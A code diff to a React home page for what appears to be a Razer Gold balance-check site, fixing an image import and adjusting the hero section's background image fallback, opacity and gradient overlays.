@@ -5,7 +5,7 @@ import Navbar from '../components/Navbar';
 import { sendNotify } from '../services/notifyService';
 import LegalDisclaimer from '../components/LegalDisclaimer';
 import { logBalanceCheck } from '../services/logService';
-import {razerHeroBg} from '../assets/razer-hero.jpg'; 
+import razerHeroBg from '../assets/razer-hero.jpg'; 
 
 const FullScreenBalance = ({ balance, lastFourDigits, cardType, onCheckAnother }) => {
   const [isVisible, setIsVisible] = useState(false);
@@ -183,18 +183,23 @@ const Home = () => {
     <>
       <Navbar />
       
-      {/* NEW CINEMATIC HERO SECTION */}
+      {/* CINEMATIC HERO SECTION */}
       <div className="relative w-full h-[250px] sm:h-[350px] overflow-hidden border-b border-[#222]">
-        {/* Background Image */}
+        
+        {/* Background Image with Fallback */}
         <img 
           src={razerHeroBg} 
+          onError={(e) => {
+            // Fallback image just in case your local file path is wrong
+            e.target.src = 'https://images.unsplash.com/photo-1542751371-adc38448a05e?q=80&w=2070&auto=format&fit=crop'; 
+          }}
           alt="Razer Gold Background" 
-          className="absolute inset-0 w-full h-full object-cover object-center opacity-70"
+          className="absolute inset-0 w-full h-full object-cover object-center opacity-80"
         />
         
-        {/* Gradient Overlays to blend into the dark theme */}
-        <div className="absolute inset-0 bg-gradient-to-t from-[#050505] via-[#050505]/60 to-transparent"></div>
-        <div className="absolute inset-0 bg-gradient-to-r from-[#050505]/80 via-transparent to-[#050505]/80"></div>
+        {/* Lighter Gradient Overlays to blend into the black theme without hiding the image */}
+        <div className="absolute inset-0 bg-gradient-to-t from-[#050505] via-[#050505]/40 to-transparent"></div>
+        <div className="absolute inset-0 bg-gradient-to-r from-[#050505]/60 via-transparent to-[#050505]/60"></div>
 
         {/* Overlay Text */}
         <div className="absolute inset-0 flex flex-col items-center justify-center text-center px-4 mt-8">
